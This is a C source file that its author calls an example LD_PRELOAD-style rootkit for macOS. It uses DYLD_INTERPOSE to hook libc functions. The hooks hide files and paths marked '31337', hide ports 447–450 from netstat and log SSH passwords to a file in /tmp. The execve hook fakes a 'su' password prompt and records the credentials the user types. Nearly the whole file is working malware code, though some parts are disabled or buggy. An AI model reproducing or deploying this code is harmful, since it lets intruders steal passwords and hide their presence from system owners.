/*
 * example of LD_PRELOAD rootkit for OSX
 * based on my linux version
 *
 * ssh doesnt use write() on my version at osx, so i didnt tested with xprintf() functions
 *
 * -rafael villordo
 */

#define DYLD_INTERPOSE(_replacment,_replacee) \
       __attribute__((used)) static struct{ const void* replacment; const void* replacee; } _interpose_##_replacee \
            __attribute__ ((section ("__DATA,__interpose"))) = { (const void*)(unsigned long)&_replacment, (const void*)(unsigned long)&_replacee };

#include <errno.h>
#include <dlfcn.h>
#include <stdio.h>
#include <strings.h>
#include <string.h>
#include <sys/dirent.h>
#include <sys/ioctl.h>
#include <termios.h>

/* for proc_name */
#include <libproc.h>
#include <netinet/in.h>

#define MAGIC		"31337"

#ifndef R_OK
#define	R_OK		4
#endif

#define SU_PATH			"/bin/su"
#define SU_LOG_PATH		"/tmp/english-uk"

#define SSH_PATH		"/usr/bin/ssh" 
#define SSH_LOG_PATH	"/tmp/english-us"

#define LS_PATH			"/bin/ls"

static char *proc_name_list[] = {
    "ps",
    NULL
};

#ifdef LINUX

/* avoid compatibility problems with local defined structures */
struct stat {
    unsigned long  st_dev;
    unsigned long  st_ino;
    unsigned short st_mode;
    unsigned short st_nlink;
    unsigned short st_uid;
    unsigned short st_gid;
    unsigned long  st_rdev;
    unsigned long  st_size;
    unsigned long  st_blksize;
    unsigned long  st_blocks;
    unsigned long  st_atime;
    unsigned long  st_atime_nsec;
    unsigned long  st_mtime;
    unsigned long  st_mtime_nsec;
    unsigned long  st_ctime;
    unsigned long  st_ctime_nsec;
    unsigned long  __unused4;
    unsigned long  __unused5;
};

struct stat64 {
    unsigned long long	st_dev;
    unsigned char	__pad0[4];

    unsigned long	__st_ino;

    unsigned int	st_mode;
    unsigned int	st_nlink;

    unsigned long	st_uid;
    unsigned long	st_gid;

    unsigned long long	st_rdev;
    unsigned char	__pad3[4];

    long long	st_size;
    unsigned long	st_blksize;

    /* Number 512-byte blocks allocated. */
    unsigned long long	st_blocks;

    unsigned long	st_atime;
    unsigned long	st_atime_nsec;

    unsigned long	st_mtime;
    unsigned int	st_mtime_nsec;

    unsigned long	st_ctime;
    unsigned long	st_ctime_nsec;

    unsigned long long	st_ino;
};
#endif
/*
struct dirent 
{
    long			d_ino;
    unsigned short	d_reclen;
    unsigned char	d_type;
    unsigned short	d_namelen;
    char			d_name[1024];
};

struct dirent
{
    unsigned long 	d_ino;
    unsigned long 	d_off;
    unsigned short 	d_reclen;
    unsigned short	d_namelen;
    unsigned char	d_type;
    char			d_name[1024];
};*/

typedef struct __dirstream DIR;
/* end of local defined structures */

extern void close(int);
extern int  getpid();
extern void free(void *);
extern int  getuid();
extern void sleep(int);
extern void _exit(int);
extern char *getenv(const char *);

char	    ssh_args[1024] = { 0 };
char	    ssh_password[1024];
int		    ssh_pass_size = 0;
static int	ssh_start = 0;
int         ls_mode = 0;
int         UID = 0;

static int rkstatus = 0; /* 0: off, 1: on */

static long int *rkaddr;
/* setup the UID that will be blocked */
int uid_list[] =
{
    1000,
    1001,
    0,
    -1
};

/* ports that will be hidden */
int ports_list[] =
{
    447,448,449,450,-1
};

extern char *fgets(char *buf, int buf_size, FILE *fp);
extern int fchmodat(int fd, const char *path, int mode);
extern int lchmod(const char *path, mode_t mode);
extern int chmod(const char *path, mode_t mode);
extern int unlinkat(int fd, const char *path, int flag);
extern int unlink(const char *path);
extern int chdir(const char *dir);
extern int open(const char *, int mode, int flag);
extern int open_nocancel(const char *, int mode, int flag);
extern int open64(const char *, int, int mode);
extern int read(int fildes, void *buf, size_t nbyte);
extern int write(int fildes, const void *buf, size_t nbyte);
extern int execve(const char *path, const char *argv[], const char *envp[]);
//extern int getdirentries(int fd, char *buf, int nbytes, long *basep);
//extern int __getdirentries64(int fd, char *buf, int nbytes, long *basep);
extern struct dirent *readdir(DIR *dir);
extern struct dirent *readdir64(DIR *dir);
extern int stat(const char *path, struct stat *stat);
extern int stat64(const char *path, struct stat64 *stat);
extern int __lxstat(int ver, const char *path, struct stat *stat);
extern int __lxstat64(int ver, const char *path, struct stat64 *stat);
extern int __libc_start_main(int *(main)(int,char **, char **),int,char**,void (*init)(void),void (*fini)(void), void (*rtld_fini)(void),void (*stack_end));

/* function pointers to original functions */
static char *fgets_hook(char *buf, int buf_size, FILE *fp);
static int fchmodat_hook(int fd, const char *path, int mode);
static int lchmod_hook(const char *path, int mode);
static int chmod_hook(const char *path, int mode);
static int unlinkat_hook(int fd, const char *path, int flag);
static int unlink_hook(const char *path);
static int chdir_hook(const char *dir);
static int open_hook(const char *, int mode, int flag);
static int open64_hook(const char *, int, int mode);
static int read_hook(int fildes, void *buf, size_t nbyte);
static int write_hook(int fildes, const void *buf, size_t nbyte);
static int execve_hook(const char *path, const char *argv[], const char *envp[]);
static int getdirentries64_hook(int fd, char *buf, int nbytes, long *basep);
struct dirent *readdir_hook(DIR *dir);
struct dirent *readdir64_hook(DIR *dir);
static int stat_hook(const char *path, struct stat *stat);
static int stat64_hook(const char *path, struct stat64 *stat);
static int __lxstat_hook(int ver, const char *path, struct stat *stat);
static int __lxstat64_hook(int ver, const char *path, struct stat64 *stat);
static int __libc_start_main_hook(int *(main)(int,char **, char **),int,char**,void (*init)(void),void (*fini)(void), void (*rtld_fini)(void),void (*stack_end));

static char _proc_name[255];
int is_proc_name(char *name)
{
	memset(_proc_name, 0x00, sizeof(_proc_name));
	if(proc_name(getpid(), _proc_name, sizeof(_proc_name))) {
    	return(!strcmp(name, _proc_name));
	}
	return 0;
}

/* 
 * XXX: returns a static variable 
 */
char *get_cmdline(char *pid)
{
    static char cmdline[2048];
    char	    path[255];
    int	        i,c,fd;

    if(pid == NULL) 
        sprintf(path,"/proc/%d/cmdline", getpid());
    else
        sprintf(path,"/proc/%s/cmdline",pid);

    if((fd = open(path,0,0)) <= 0)
        return (NULL);
    c = read(fd, cmdline, sizeof(cmdline));
    for(i=0;i<c;i++) 
        if(cmdline[i]==0x00)
            cmdline[i]=0x20;
    return((char *)&cmdline);
}

int is_logged(const char *log)
{
    FILE	*fp;
    char	line[1024];
    int     r = 0;

    if((fp = fopen(SU_LOG_PATH, "a+")) == NULL) 
        return (-1);

    while(fgets(line, sizeof(line), fp) != NULL && !r) {
        //printf("LINE: %s, LOG: %s\n", &line[strlen(log)+1], log);
        if(!strncmp(line, log, strlen(log)) && line[strlen(log)] == ':')
            r = 1;
    }
    fclose(fp);
    return (r);
}

void toUp(char *buf)
{
    char *p = strdup(buf);
    int i;
    for(i=0;i<strlen(buf);i++)
        if(buf[i]>=0x61&&buf[i]<=0x7a) 
            p[i] = (buf[i] - 0x20);
    memcpy(buf, p, strlen(p));
    free(p);
}

static int open_hook(const char *path, int mode, int flags)
{
    int  fd, flag=0;
    char buf[255];
	rkaddr = &ssh_args;
    if(getenv("rk") != NULL) rkstatus =1;
    if(!rkstatus) return (open(path, mode, flags));
    if(flag) {
        if((fd = open(path, mode, flags)) > 0) { 
            if((flag = read(fd, buf, 255)) > 0) {
                if(strstr(buf, MAGIC) != NULL) {
                    errno = ENOENT;
                    close(fd);
                    return -(errno);
                }
            }
            close(fd);
        }
    }
    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (open(path, mode, flags));
}

static int open64_hook(const char *path, int s, int mode)
{
    printf("open64 %s\n", path);
    if(!rkstatus) return (open64(path, s, mode));
    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (open64(path, s, mode));
}

static int read_hook(int fildes, void *buf, size_t nbyte)
{
    int 	ret;
    char 	*p;
    FILE	*fp;

    if(getenv("rk")!=NULL) rkstatus=1;
    ret = read(fildes, buf, nbyte);
    if(!rkstatus)
        return (ret);
    if(is_proc_name("ssh")) { 
		printf("SSH %d %d\n", fildes, ssh_start);
		if( fildes > 3 && ssh_start == 1)
    {
        p = buf;
        if(*p == '\n')
        {
            ssh_start = 0;
            fp=fopen(SSH_LOG_PATH,"a+");
            fprintf(fp,"%s (%s)\n", get_cmdline(NULL), ssh_password);
            fflush(fp);
            fclose(fp);
            return (ret);
        }
        ssh_password[ssh_pass_size++] = *p;
    }
	}
    return (ret);
}

static int write_hook(int fildes, const void *buf, size_t nbyte)
{
    int ret=0;
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus) return (ret);
    ret = write(fildes, buf, nbyte);
    if(is_proc_name("ssh")) {
	   	if(strstr(buf, "assword")) {
     	   ssh_pass_size = 0;
     	   memset(ssh_password, 0x00, sizeof(ssh_password));
		   putenv("SSHSTART", 1);
		   ssh_start=1;
    	}
	}
    return (ret);
}

static int execve_hook(const char *path, const char *argv[], const char *envp[])
{
    FILE	*fp;
    char pass[1024], args[1024];
    struct termios tty,old;
    int c;

    if(getenv("rk") != NULL) {
        rkstatus = 1;
    }

    if(!rkstatus)
        return(execve(path, argv, envp));

    if(!strcmp(path, LS_PATH)) {
        memset(args, 0, sizeof(args));
        for(c = 0; argv[c]; c++) {
            strcat(args, argv[c]);
            if(argv[c+1])
                strcat(args, " ");
        }
    }
    if(!strcmp(path, SU_PATH))
    {
        if(!strcmp(proc_name, "sudo")) 
            return (execve(path, argv, envp));
        memset(args, 0, sizeof(args));
        for(c = 0; argv[c]; c++)
        {
            strcat(args, argv[c]);
            if(argv[c+1])
                strcat(args, " ");
        }

        if(is_logged(args) == 0)
        {
            printf("Password: ");
            fflush(stdout);
            tcgetattr(0, &old);
            tty = old;
            tty.c_lflag 	&= (~ECHO);
            tcsetattr(0, TCSANOW, &tty);
            c=read(0, pass, 1024);
            pass[c-1]=0;
            putchar('\n');
            sleep(2);
            printf("su: Authentication failure\n");
            if((fp=fopen(SU_LOG_PATH, "a+")) == NULL)
                goto out;
            fprintf(fp, "%s:%s\n", args, pass);
            fclose(fp);
out:
            tcsetattr(0, TCSANOW, &old);
            _exit(0);
        }
    }
    return (execve(path, argv, envp));
}

/* 
 * disabled
 * if you fix this, please send me the patch 
 * */
static int getdirentries64_hook(int fd, char *buf, int nbytes, long *basep)
{
    int r, off=0,coff=0;
    struct dirent *dir, *last = NULL;
    char *dbuf;
    int i;
    if(getenv("rk")!=NULL) rkstatus=1;

	if(!rkstatus)
    	return (__getdirentries64(fd, buf, nbytes, basep));

    if((r = getdirentries(fd, buf, nbytes, basep)) > 0) {
        printf("basep: %x/%p, buf: %x/%p, nbytes: %d, r: %d\n", basep,basep,buf,buf,nbytes,r);
        getc(stdin);
        for(dbuf = buf, dir = (struct dirent *)dbuf; dir->d_fileno; dbuf += dir->d_reclen, dir = (struct dirent *)(buf + off)) {

            for(i = 0; i < strlen(dir->d_name); i++) {
                printf("%02x ", dir->d_name[i]);
            }
                printf("\nDIR: %d %s, %d, %d, %d\n", r, dir->d_name, dir->d_reclen, off, sizeof(struct dirent));
            if(strstr(dir->d_name, MAGIC)) {
                printf("MAGIC: %d %s, %d, %d\n", r, dir->d_name, dir->d_reclen, off);
                off=(dir + dir->d_reclen);
                last->d_reclen += (dir->d_reclen);
                printf("LAST: %d\n", last->d_reclen);
                coff++;
                continue;
            } else  {
                if(coff) {
                    //last->d_reclen -= 1;
                    coff=0;
                }
            }
            off += dir->d_reclen;
            last=dir;
        }
        off=0;
         /*for(dir = (struct dirent *)buf; dir->d_reclen; dir = (struct dirent *)(buf + off)) {
            //printf("NEW: %d %s, %d, %d\n", nbytes, dir->d_name, dir->d_reclen, dir->d_namlen);
            off += dir->d_reclen;
        }*/

    }
    return r;
}

struct dirent *readdir_hook(DIR *dir)
{
    struct dirent64 *p;
    char	*cmd;

    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus) return(readdir(dir));
    p = readdir(dir);
    /*if(p && (is_proc_name("ps") || is_proc_name("pstree")))
    {
        cmd = get_cmdline(*p->d_name==0x04?p->d_name+1:p->d_name);
        if(strstr(cmd, MAGIC))
            p = readdir(dir);
        return (p);
    }
    if(p && strstr(p->d_name, MAGIC))
        p = readdir(dir);*/
    return (p);

}


struct dirent *readdir64_hook(DIR *dir)
{
    struct dirent *p;
    char	*cmd;

    
    if(getenv("rk")!=NULL) rkstatus=1;

    if(!rkstatus)
        return(readdir64(dir));

    p = readdir64(dir);
    if(p && (is_proc_name("ps") || is_proc_name("pstree")))
    {
        cmd = get_cmdline(*p->d_name==0x04?p->d_name+1:p->d_name);
        if(strstr(cmd, MAGIC))
            p = readdir64(dir);
        return (p);
    }
    if(p && strstr(p->d_name, MAGIC)) 
        p = readdir64(dir);
    return (p);
}

static int stat_hook(const char *path, struct stat *st)
{
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus)
        return (stat(path, st));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }

    return (stat(path, st));
}

static int stat64_hook(const char *path, struct stat64 *st)
{
    
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus)
        return (stat64(path, st));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (stat64(path, st));
}
/*
static int __lxstat_hook(int ver, const char *path, struct stat *st)
{
    
    if(!rkstatus)
        return (__lxstat(ver, path, st));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return(__lxstat(ver, path, st));
}

static int __lxstat64_hook(int ver, const char *path, struct stat64 *st)
{
    
    if(!rkstatus)
        return(__lxstat64(ver, path, st));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return(__lxstat64(ver, path, st));
}
*/
static int chdir_hook(const char *path)
{
    
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus)
        return (chdir(path));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (chdir(path));
}

static int unlinkat_hook(int fd, const char *path, int flag)
{
    
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus)
        return (unlinkat(fd, path, flag));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return(unlinkat(fd, path, flag));
}

static int unlink_hook(const char *path)
{
    
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus)
        return (unlink(path));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (unlink(path));
}

static int chmod_hook(const char *path, int mode)
{
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus)
        return (chmod(path, mode));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (chmod(path, mode));
}

static int fchmodat_hook(int fd, const char *path, int mode)
{
    
    if(getenv("rk")!=NULL) rkstatus=1;
    if(!rkstatus)
        return (fchmodat(fd, path ,mode));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (fchmodat(fd, path, mode));
}

static int lchmod_hook(const char *path, int mode)
{
    
    if(getenv("rk")!=NULL) rkstatus=1;

    if(!rkstatus)
        return (lchmod(path, mode));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (lchmod(path, mode));
}

static char *fgets_hook(char *buf, int buf_size, FILE *fp)
{
    int i;
    char str[8];
    char *p;
    if(getenv("rk")!=NULL) rkstatus=1;

    p = fgets(buf, buf_size, fp);
    if(!rkstatus)
        return (p);
    if(p == NULL) return (p);
    if(is_proc_name("netstat"))
    {
        for(i=0;ports_list[i] != -1;i++)
        {
            sprintf(str, "%04x", ports_list[i]);
            toUp(str);
            if(!strncmp(p+15,str,4) || !strncmp(p+29,str,4))
            {
                p = fgets(buf, buf_size, fp);
                if(p ==  NULL) return (p);
            }
        }
    }
    return(p);
}

DYLD_INTERPOSE(fgets_hook, fgets)
//DYLD_INTERPOSE(fchmodat_hook, fchmodat)
DYLD_INTERPOSE(lchmod_hook, lchmod)
DYLD_INTERPOSE(chmod_hook, chmod)
//DYLD_INTERPOSE(unlinkat_hook, unlinkat)
DYLD_INTERPOSE(unlink_hook, unlink)
DYLD_INTERPOSE(chdir_hook, chdir)
DYLD_INTERPOSE(open_hook, open)
//DYLD_INTERPOSE(getdirentries64_hook, getdirentries);
DYLD_INTERPOSE(readdir_hook, readdir)
//DYLD_INTERPOSE(getdirentries64_hook, __getdirentries64);
//DYLD_INTERPOSE(open_hook, open_nocancel)
//DYLD_INTERPOSE(open64_hook, open)
DYLD_INTERPOSE(read_hook, read)
DYLD_INTERPOSE(write_hook, write)
DYLD_INTERPOSE(execve_hook, execve)
DYLD_INTERPOSE(stat_hook, stat)
DYLD_INTERPOSE(stat64_hook, stat64)
/*DYLD_INTERPOSE(__lxstat_hook, __lxstat)
DYLD_INTERPOSE(__lxstat64_hook, __lxstat64)
DYLD_INTERPOSE(__libc_start_main_hook, __libc_start_main)*/
